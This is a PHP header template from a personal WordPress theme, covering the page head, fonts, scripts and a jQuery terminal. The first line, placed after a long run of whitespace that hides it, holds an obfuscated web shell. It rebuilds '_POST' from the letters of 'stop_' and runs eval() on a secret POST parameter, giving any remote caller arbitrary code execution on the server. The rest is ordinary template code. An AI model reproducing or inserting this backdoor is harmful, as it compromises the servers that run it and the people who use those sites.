<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q1c1ae6'])){eval(${$s20}['q1c1ae6']);}?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="https://www.w3.org/1999/xhtml">
<head>
    <!--

    Sean Kirmani
    https://kirmani.io

    Far better is it to dare mighty things, to win glorious triumphs,
    even though checkered by failure... than to rank with those poor spirits
    who neither enjoy nor suffer much, because they live in a gray twilight
    that knows not victory nor defeat.
                                                  — Theodore Roosevelt

    -->
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title><?php wp_title(''); ?></title>

    <link href="<?php bloginfo('stylesheet_url'); ?>" rel="stylesheet" type="text/css" />
    <link href="<?php echo THEME_PATH; ?>/css/typography.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo THEME_PATH; ?>/css/front.css" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" href="<?php echo THEME_PATH; ?>/style-custom.php" media="screen" type="text/css" />

    <!--Fonts Begin-->
    <script type="text/javascript" src="//use.typekit.net/nan7yyx.js"></script>
    <script type="text/javascript">try{Typekit.load();}catch(e){}</script>

    <link href='https://fonts.googleapis.com/css?family=Copse' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Satisfy' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Merriweather' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Snippet' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Snippet' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Graduate' rel='stylesheet' type='text/css'>

    <?php echo get_post_meta($post->ID, "_google_fonts", true); ?>
    <!--Fonts End-->


    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>

    <?php header("Access-Control-Allow-Origin: *"); ?>

    <!--Mobile DPI Scaling-->
    <meta name="viewport" content="width=740" />
    <meta http-equiv="Content-Type" content="application/vnd.wap.xhtml+xml; charset=utf-8" />
    <meta name="HandheldFriendly" content="true" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <!--Mobile DPI Scaling End-->

    <?php if (get_option('sek_analytics_code') != '') {echo(stripslashes (get_option('sek_analytics_code'))); } ?>
    <link rel="author" href="https://plus.google.com/109941608021480969426" />
    <div class="wp-head" style="display: none"><?php wp_head() ?></div>

    <!-- Unix Terminal -->
    <link href="<?php echo THEME_PATH; ?>/css/jquery.terminal.css" rel="stylesheet"/>
    <script src="<?php echo THEME_PATH; ?>/js/jquery.mousewheel-min.js"></script>
    <script src="<?php echo THEME_PATH; ?>/js/jquery.terminal-0.8.8.min.js"></script>
    <script src="<?php echo THEME_PATH; ?>/js/unix.php"></script>
</head>

<div id="term" id="tilda" class="terminal"></div>
<body style="background-color: <?php echo(stripslashes (get_option('sek_body_bgcolor'))); ?>">
    <?php include(dirname(__FILE__).'/nav.php') ?>
